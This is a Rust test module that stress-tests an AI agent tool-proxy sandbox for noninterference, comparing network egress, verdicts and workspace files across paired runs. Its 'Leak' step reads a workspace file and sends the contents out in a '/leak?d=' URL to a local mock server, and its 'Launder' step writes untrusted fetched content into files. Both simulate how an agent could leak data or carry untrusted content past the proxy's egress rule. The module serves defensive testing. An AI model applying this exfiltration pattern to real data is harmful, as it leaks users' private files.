//! `--mode hyper` — noninterference, tested the way "Testing Noninterference,
//! Quickly" (Hritcu et al.) tests it: run the same program twice, identical in
//! every LOW input and different only in HIGH ones, and require everything the
//! observer can see to be identical.
//!
//! Two instantiations, because nucleus makes two different claims:
//!
//! - **`--high web` — integrity**, the claimed one: adversarial content never
//!   reaches a trusted sink. High is the local web server's body (untrusted, two
//!   equal-length variants); the observer sees the workspace files after the run,
//!   every call's status and refusal code, and the egress log. The program
//!   launders: `Launder` fetches a page and writes what came back into a file.
//! - **`--high files` — confidentiality of workspace files.** High is the contents
//!   of `a.txt`/`b.txt`; the observer sees the egress log and the verdict stream.
//!   Read contents are returned to the agent inside the sandbox and are not observed.
//!   `Leak` reads a file and fetches `/leak?d=<what it read>`. Workspace files are
//!   labelled `Internal`, and the trifecta rule refuses egress only once untrusted
//!   content is in the session — so a read followed by a first fetch is expected to
//!   leak, and this instantiation measures that window rather than a claim.
//!
//! Equal lengths across each pair: a size difference is a channel outside the
//! termination-insensitive stance, so it is excluded rather than tested by accident.

use std::sync::Arc;

use anyhow::{Context, Result};

use super::mock_web::MockWeb;
use super::{Args, Rng};

/// Which input is high.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum High {
    Web,
    Files,
}

#[derive(Debug, Clone, Copy)]
enum Step {
    Read(&'static str),
    Write(&'static str),
    Fetch,
    Glob,
    /// Read the file, then fetch a URL carrying what was read.
    Leak(&'static str),
    /// Fetch a page, then write what came back into the file.
    Launder(&'static str),
}

fn program(seed: u64, len: usize) -> Vec<Step> {
    let mut rng = Rng::new(seed);
    let file = |r: &mut Rng| if r.below(2) == 0 { "a.txt" } else { "b.txt" };
    (0..len)
        .map(|_| match rng.below(10) {
            0 | 1 => Step::Read(file(&mut rng)),
            2 | 3 => Step::Leak(file(&mut rng)),
            4 | 5 => Step::Launder(file(&mut rng)),
            6 => Step::Write(file(&mut rng)),
            7 => Step::Fetch,
            _ => Step::Glob,
        })
        .collect()
}

/// The two high inputs of a pair: equal length, different bytes.
const VARIANTS: [&str; 2] = ["variant-AAAAAAAA", "variant-BBBBBBBB"];

/// What the observer saw of one run, and whether the run touched the high input.
struct Observed {
    calls: Vec<String>,
    egress: Vec<String>,
    files: Vec<String>,
    touched_high: bool,
}

fn run_once(a: &Args, high: High, steps: &[Step], variant: usize) -> Result<Observed> {
    let v = VARIANTS[variant];
    let (file_seed, web_body) = match high {
        High::Files => (v.to_owned(), "fixed page body".to_owned()),
        High::Web => ("fixed contents".to_owned(), v.to_owned()),
    };
    let work = std::env::temp_dir().join(format!(
        "nucleus-stress-hyper-work-{}-{variant}",
        std::process::id()
    ));
    std::fs::create_dir_all(&work)?;
    for f in ["a.txt", "b.txt"] {
        std::fs::write(work.join(f), format!("{file_seed}-{f}"))?;
    }
    let web = MockWeb::serving(web_body).context("starting the local web server")?;
    let proxy = crate::agency::spawn_local_proxy(&crate::agency::LocalProxyConfig {
        run_id: format!("stress-hyper-{}-{variant}", std::process::id()),
        name: "stress-hyper",
        proxy_bin: &a.proxy_bin,
        work_dir: &work,
        lattice: super::trifecta_lattice()?,
        network: serde_json::json!({ "dns_allow": [web.addr.to_string()] }),
        duration_secs: 600,
        certificate: None,
    })
    .context("spawning the tool-proxy")?;
    let secret = Arc::new(proxy.auth_secret.clone());
    let base = format!("http://{}", web.addr);
    let call = |route: &str, body: serde_json::Value| -> Result<(u16, String, serde_json::Value)> {
        let (status, text, _) =
            crate::signed_tool_call(&proxy.proxy_url, &secret, "nucleus-stress", route, body)?;
        let v = serde_json::from_str(&text).unwrap_or(serde_json::Value::Null);
        let code = super::refusal_code(&v).unwrap_or_else(|| "-".into());
        Ok((status, code, v))
    };
    let ok = |s: u16| (200..300).contains(&s);
    let field = |v: &serde_json::Value, k: &str| {
        v.get(k)
            .and_then(|c| c.as_str())
            .unwrap_or("none")
            .to_owned()
    };

    let mut calls = Vec::new();
    let mut touched_high = false;
    for (i, step) in steps.iter().enumerate() {
        let mut observe = |label: String, status: u16, code: String| {
            calls.push(format!("{i:>3} {label:<18} {status} {code}"))
        };
        match *step {
            Step::Read(f) => {
                let (s, c, _) = call("read", serde_json::json!({ "path": f }))?;
                touched_high |= high == High::Files && ok(s);
                observe(format!("read {f}"), s, c);
            }
            Step::Write(f) => {
                let (s, c, _) = call("write", serde_json::json!({ "path": f, "contents": "low" }))?;
                observe(format!("write {f}"), s, c);
            }
            Step::Fetch => {
                let (s, c, _) = call(
                    "web_fetch",
                    serde_json::json!({ "url": format!("{base}/page") }),
                )?;
                touched_high |= high == High::Web && ok(s);
                observe("fetch".into(), s, c);
            }
            Step::Glob => {
                let (s, c, _) = call("glob", serde_json::json!({ "pattern": "*.txt" }))?;
                observe("glob".into(), s, c);
            }
            Step::Leak(f) => {
                let (s, c, v) = call("read", serde_json::json!({ "path": f }))?;
                touched_high |= high == High::Files && ok(s);
                observe(format!("leak-read {f}"), s, c);
                let got =
                    field(&v, "contents").replace(|ch: char| !ch.is_ascii_alphanumeric(), "_");
                let (s, c, _) = call(
                    "web_fetch",
                    serde_json::json!({ "url": format!("{base}/leak?d={got}") }),
                )?;
                touched_high |= high == High::Web && ok(s);
                observe(format!("leak-fetch {f}"), s, c);
            }
            Step::Launder(f) => {
                let (s, c, v) = call(
                    "web_fetch",
                    serde_json::json!({ "url": format!("{base}/page") }),
                )?;
                touched_high |= high == High::Web && ok(s);
                observe(format!("launder-fetch {f}"), s, c);
                let (s, c, _) = call(
                    "write",
                    serde_json::json!({ "path": f, "contents": field(&v, "body") }),
                )?;
                observe(format!("launder-write {f}"), s, c);
            }
        }
    }
    let egress = web.requests.lock().map(|r| r.clone()).unwrap_or_default();
    drop(proxy);
    // The workspace is observable only when it is not itself the high input.
    let files = match high {
        High::Files => Vec::new(),
        High::Web => ["a.txt", "b.txt"]
            .iter()
            .map(|f| {
                std::fs::read_to_string(work.join(f))
                    .map(|c| format!("{f}: {c}"))
                    .with_context(|| format!("reading {f} back"))
            })
            .collect::<Result<_>>()?,
    };
    let _ = std::fs::remove_dir_all(&work);
    Ok(Observed {
        calls,
        egress,
        files,
        touched_high,
    })
}

/// The first place two sequences differ, as a printable pair.
fn first_difference(x: &[String], y: &[String]) -> Option<(String, String)> {
    let none = || "(nothing)".to_owned();
    (0..x.len().max(y.len()))
        .map(|i| {
            (
                x.get(i).cloned().unwrap_or_else(none),
                y.get(i).cloned().unwrap_or_else(none),
            )
        })
        .find(|(p, q)| p != q)
}

enum Trial {
    Held,
    Violated(String),
    CouldNotLook,
}

fn trial(a: &Args, seed: u64) -> Result<Trial> {
    let steps = program(seed, a.ops);
    let r = [
        run_once(a, a.high, &steps, 0)?,
        run_once(a, a.high, &steps, 1)?,
    ];
    if a.verbose {
        println!("seed {seed}:");
        for c in &r[0].calls {
            println!("  {c}");
        }
    }
    // Non-vacuity: the variants differ by construction; the program must also have
    // actually taken the high input in, in both runs.
    if !r.iter().all(|o| o.touched_high) {
        return Ok(Trial::CouldNotLook);
    }
    let observers = [
        ("the network", &r[0].egress, &r[1].egress),
        ("the verdict stream", &r[0].calls, &r[1].calls),
        ("the workspace", &r[0].files, &r[1].files),
    ];
    let mut report = String::new();
    for (name, x, y) in observers {
        if let Some((p, q)) = first_difference(x, y) {
            report.push_str(&format!(
                "  {name} differs\n    run A: {p}\n    run B: {q}\n"
            ));
        }
    }
    Ok(if report.is_empty() {
        Trial::Held
    } else {
        Trial::Violated(report)
    })
}

/// `--trials` short programs from consecutive seeds: one session saturates after
/// its first untrusted fetch, so many short programs reach more than one long one.
pub fn run(a: &Args) -> Result<i32> {
    let (mut held, mut blind, mut first) = (0usize, 0usize, None);
    let mut violated = 0usize;
    for seed in a.seed..a.seed + a.trials {
        match trial(a, seed)? {
            Trial::Held => held += 1,
            Trial::CouldNotLook => blind += 1,
            Trial::Violated(report) => {
                violated += 1;
                first.get_or_insert((seed, report));
            }
        }
    }
    println!(
        "high = {:?}: {} trial(s) of {} step(s) — held {held}, violated {violated}, could not look {blind}",
        a.high, a.trials, a.ops
    );
    if let Some((seed, report)) = first {
        println!("NONINTERFERENCE VIOLATED (first at --seed {seed}):\n{report}");
        return Ok(1);
    }
    if held == 0 {
        println!("could not look: no trial took the high input in both runs");
        return Ok(2);
    }
    println!("noninterference held on every trial that looked");
    Ok(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn variants_are_equal_length_and_different() {
        assert_eq!(VARIANTS[0].len(), VARIANTS[1].len());
        assert_ne!(VARIANTS[0], VARIANTS[1]);
    }

    #[test]
    fn a_length_difference_is_a_difference() {
        let a = vec!["x".to_owned()];
        assert!(first_difference(&a, &[]).is_some());
        assert!(first_difference(&a, &a).is_none());
    }

    #[test]
    fn the_program_depends_only_on_the_seed() {
        let show = |s: u64| format!("{:?}", program(s, 50));
        assert_eq!(show(7), show(7));
        assert_ne!(show(7), show(8));
    }
}
